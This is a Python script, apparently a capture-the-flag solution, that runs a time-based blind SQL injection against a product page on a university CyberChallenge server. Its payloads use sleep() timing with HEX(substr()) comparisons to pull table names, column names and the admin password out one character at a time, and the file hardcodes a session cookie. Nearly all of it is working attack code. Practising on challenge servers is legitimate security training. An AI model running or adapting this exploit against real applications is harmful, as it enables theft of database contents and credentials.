#!/usr/bin/env python3

# import pyclip
import binascii
import requests
import string
import time

def string_to_hex(input_string):
    '''
    Convert a string to its hexadecimal representation
    the same way that sqlite3 HEX() function does.
    '''
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()


# Your cookies here
cookies = {
    'session': '.eJwlzjsOwyAQBcC7UKdY4AGLL2OxPyWtHVdR7h5L6aeYT9rj8POZtvdx-SPtL0tbmlINRrOyAEWBLOKRg2Yfywp3ttJiqugEuK4Qbyhk3Mv0pat1yM2lM0GURR1YYS3Dg0hljTzIaqOOuP1Qq8bLOQ-niI50R67Tj_8G6fsDE9gwug.Z-JsKQ.qSHsHxz8fqaBTo4qeMYhJu6zAq8',
}

# A session object to keep track of cookies
browser = requests.Session()

# The target URL
url = 'http://cyberchallenge.disi.unitn.it:50050/product/3'
secret = ''
i = 1 # Used to pass to the next character when found one
while True:
    found = False
    for character in string.printable:
        #print(f'Checking character {character}')   
        # Injection for table name
        injTab = f"1 And if(HEX((Select substr(table_name,{i},1) From infOrmation_schema.tables Where table_schema=database() limit 1,1))='{string_to_hex(character)}', sleep(1), null)"
        # Injection for columns names
        injCol = f"1 And if(HEX((Select substr(column_name,{i},1) From infOrmation_schema.columns Where table_name='user' limit 2,1))='{string_to_hex(character)}', sleep(1), null)"
        # Injection for admin password
        injPsw = f"1 And if(HEX((Select substr(passwOrd,{i},1) From user Where username='admin'))='{string_to_hex(character)}', sleep(1), null)"
        
        data = {
            'offer': f'{injPsw}'
        }
        start_time = time.time()
        response = browser.post(url, cookies=cookies, data=data, allow_redirects=False)
        elapsed_time = time.time() - start_time
        
        if elapsed_time >= 1: # Check if response time exceeds 1 seconds
            secret += character
            i += 1
            found = True
            #print(response.status_code)
            print(f'New character found ({character}): {secret}')
            continue
    if not found:
        break
    
        
print(f'Found secret: {secret}')
